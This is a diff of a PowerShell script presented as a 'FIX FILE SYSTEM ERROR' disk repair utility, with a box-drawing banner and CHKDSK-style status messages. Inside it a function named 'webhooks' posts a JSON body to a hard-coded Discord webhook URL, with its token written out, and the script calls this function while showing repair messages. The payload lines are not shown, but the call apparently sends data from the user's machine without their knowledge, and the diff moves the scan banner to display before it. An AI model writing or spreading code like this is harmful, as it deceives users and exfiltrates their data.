@@ -30,11 +30,15 @@ $text = @"
     $([char]0x2551)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2580)$([char]0x2584) $([char]0x2592)$([char]0x2592)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588)    $([char]0x2580)$([char]0x2588)$([char]0x2580)    $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588)   $([char]0x2551)
     $([char]0x2551)                                                                      $([char]0x2551)
     $([char]0x255A)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x255D)
-                           --- FIX FILE SYSTEM ERROR ---
+                          --- FIX FILE SYSTEM ERROR ---
 
 "@
 
 Write-Host $text -ForegroundColor Cyan
+Write-Host "------------------------------------------------------------------------------------"
+Write-Host "  SCAN DISK + FIX SYSTEM FILE + RESTORE HEALTHY" -ForegroundColor Yellow
+Write-Host "------------------------------------------------------------------------------------"
+
 function webhooks {
     $discordWebhookUrl = "https://discordapp.com/api/webhooks/1337473337823203381/0gtdn-CLf_3uhKb1skosboqeWKwF2S9DQ6H-m10B4C0NVVll2v435GbwsU4I-tCOBkAh"
 
@@ -94,9 +98,7 @@ function webhooks {
     Invoke-RestMethod -Uri $discordWebhookUrl -Method Post -ContentType "application/json" -Body $body
 }
 webhooks
-Write-Host "------------------------------------------------------------------------------------"
-Write-Host "  SCAN DISK + FIX SYSTEM FILE + RESTORE HEALTHY" -ForegroundColor Yellow
-Write-Host "------------------------------------------------------------------------------------"
+
 Write-Host " + RUN CHKDSK TO CHECK ERROR DISK" -ForegroundColor Green
 Write-Host " + SCAN DISK.." -ForegroundColor Green
 Start-Sleep 2
@@ -141,3 +143,4 @@ Write-Host ""
 
 # Pause to allow the user to view the output
 Read-Host " Press Enter to exit"
+exit
